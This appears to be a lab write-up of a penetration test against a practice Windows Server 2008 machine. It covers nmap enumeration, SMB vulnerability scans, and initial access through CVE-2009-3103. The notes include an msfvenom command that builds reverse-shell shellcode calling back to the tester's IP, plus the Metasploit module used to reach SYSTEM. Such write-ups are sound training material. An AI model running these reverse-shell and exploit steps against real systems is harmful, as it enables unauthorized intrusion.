---
date: 2025-08-19
title: Internal
tags:
  - Windows
---
Difficulty: Easy
# Service Enumeration


IP: 192.168.179.40

`sudo nmap $ip -sV -sC -oN ver_script.nmap`

```
Not shown: 987 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.0.6001 (17714650)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
| rdp-ntlm-info:
|   Target_Name: INTERNAL
|   NetBIOS_Domain_Name: INTERNAL
|   NetBIOS_Computer_Name: INTERNAL
|   DNS_Domain_Name: internal
|   DNS_Computer_Name: internal
|   Product_Version: 6.0.6001
|_  System_Time: 2025-05-26T19:40:52+00:00
|_ssl-date: 2025-05-26T19:41:00+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=internal
| Issuer: commonName=internal
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2025-03-04T23:44:47
| Not valid after:  2025-09-03T23:44:47
| MD5:   00e7:c61b:e058:3a1c:5dd7:83e9:ff8a:d536
|_SHA-1: 622a:8de8:97a5:86e0:ab0b:0b4e:598f:3a79:a239:5431
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_se

Host script results:
| smb2-security-mode:
|   2:0:2:
|_    Message signing enabled but not required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| nbstat: NetBIOS name: INTERNAL, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:86:5a:1f (VMware)
| Names:
|   INTERNAL<00>         Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|_  INTERNAL<20>         Flags: <unique><active>
| smb2-time:
|   date: 2025-05-26T19:40:52
|_  start_date: 2025-03-05T23:44:46
| smb-os-discovery:
|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: internal
|   NetBIOS computer name: INTERNAL\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-05-26T12:40:52-07:00
|_clock-skew: mean: 1h24m01s, deviation: 3h07m50s, median: 0s
```

I'll start a UDP scan in the background while enumerating the services we've discovered so far:

`sudo nmap -Pn -n $ip -sU --top-ports=100 --reason`

```
PORT      STATE         SERVICE      REASON
17/udp    open|filtered qotd         no-response
53/udp    open          domain       udp-response ttl 125
111/udp   open|filtered rpcbind      no-response
137/udp   open          netbios-ns   udp-response ttl 125
138/udp   open|filtered netbios-dgm  no-response
161/udp   open|filtered snmp         no-response
445/udp   open|filtered microsoft-ds no-response
500/udp   open|filtered isakmp       no-response
1022/udp  open|filtered exp2         no-response
1029/udp  open|filtered solid-mux    no-response
1900/udp  open|filtered upnp         no-response
2048/udp  open|filtered dls-monitor  no-response
4500/udp  open|filtered nat-t-ike    no-response
32815/udp open|filtered unknown      no-response
49194/udp open|filtered unknown      no-response
```

Port 17, qotd really catches my attention here as I've never heard of it. [Quote of the Day](https://en.wikipedia.org/wiki/QOTD) can be abused to carry out DOS (denial of service), but that won't help us gain access to the system in this lab.

# Port 53 - DNS

The nmap output indicates this machine is part of a "workgroup" meaning it isn't domain joined. I wouldn't expect a DNS server running on a standalone Windows machine, so this sticks out a bit. If we can perform a zone transfer (AXFR), we might be able to gain more information. However, this fails:

`dig axfr @192.168.179.40 internal`

```
; <<>> DiG 9.20.7-1-Debian <<>> axfr @192.168.179.40 internal
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

# Port 5357 - HTTP

![[Pasted image 20250526124439.png]]

Since the nmap scan lists this as Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP), this doesn't seem to be a web app with a traditional server. More likely, this is used for a web service on the target.

I'll try the upnp-info nmap script, just to check for UPnP, but it comes back as closed.

`nmap -p 1900 --script=upnp-info $ip`

```
PORT     STATE  SERVICE
1900/tcp closed upnp
```

# Port 445 - SMB
Anonymous/null authentication is allowed but doesn't give any permissions to list shares.

`smbclient //$ip$/IPC$ -N`

```
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_ACCESS_DENIED listing \*
smb: \>
```

I'll go ahead and run all SMB vuln scan scripts:

`nmap --script smb-vuln* -p 139,445 $ip`

```
Host script results:
| smb-vuln-cve2009-3103:
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|
|     Disclosure date: 2009-09-08
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT
```

CVE-2009-3103 may allow us remote code execution to gain initial access.

And... if nothing else comes up, we should be able to use EternalBlue. I'm not sure why it wasn't included in the previous scan, but was able to confirm the target is vulnerable with:

`nmap --script smb-vuln-ms17-010 -p445 $ip`

## Initial Access with CVE-2009-3103 / MS09-050

https://www.exploit-db.com/exploits/40280

I'll copy/**m**irror the exploit to my working directory as 40280.py.

`searchsploit 40280 -m`

The commend on line 23 tells us that that the "shell += "..." lines were generated by the command `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.30.77 LPORT=443  EXITFUNC=thread  -f python` 

Running this myself, I saw that the lines began with "buf" instead of "shell". This is arbitrary, but I'll want to modify it to be consistent with the script. 

I substituted my IP and also opted to change the payload to windows/shell_reverse_tcp in the msfvenom command to generate my own shellcode, and then replaced all instances of "buf" with "shell":

`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.195 LPORT=443  EXITFUNC=thread  -f python -o payload`

`sed 's/buf/shell/g' < payload > updated_payload`

Now I simply copy/pasted the contents of the updated_payload into 40280.py. I wasn't able to get this payload working, and eventually resorted to metasploit; I used exploit windows/smb/ms09_050_smb2_negotiate_func_index within metasploit to gain access as NT Authority / System and find the final flag.
